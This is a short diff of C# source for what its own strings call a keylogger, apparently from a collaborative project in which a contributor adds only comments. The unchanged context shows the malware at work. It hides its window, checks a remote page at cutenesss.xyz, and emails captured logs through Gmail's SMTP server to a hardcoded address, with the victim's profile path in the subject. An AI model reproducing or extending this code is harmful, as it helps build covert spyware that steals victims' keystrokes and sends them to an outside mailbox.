@@ -33,7 +33,7 @@ namespace Karios
             {
                 try
                 {
-                    string webData = wc.DownloadString("http://cutenesss.xyz/SteamerTest.html");
+                    string webData = wc.DownloadString("http://cutenesss.xyz/SteamerTest.html"); // get rid of this cancerous website Sam -- STBoyden
                     if (!webData.ToUpperInvariant().Contains("Keyonline"))
                     // Hide the window
                     ShowWindow(handle, SW_HIDE);
@@ -99,7 +99,7 @@ namespace Karios
                     try
                     {
                         var mail = new MailMessage();
-                        var SmtpServer = new SmtpClient("smtp.gmail.com");
+                        var SmtpServer = new SmtpClient("smtp.gmail.com"); // VSCode is suggesting another library, "MimeKit" - should be on GitHub if you want to check it out at https://github.com/jstedfast/MimeKit. It may need us to rewrite some code if we do implement it though -- STBoyden
                         mail.From = new MailAddress("GINGIRULES@gmail.com");
                         mail.To.Add("GINGIRULES@gmail.com");
                         mail.Subject = "log from keylogger on" + Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
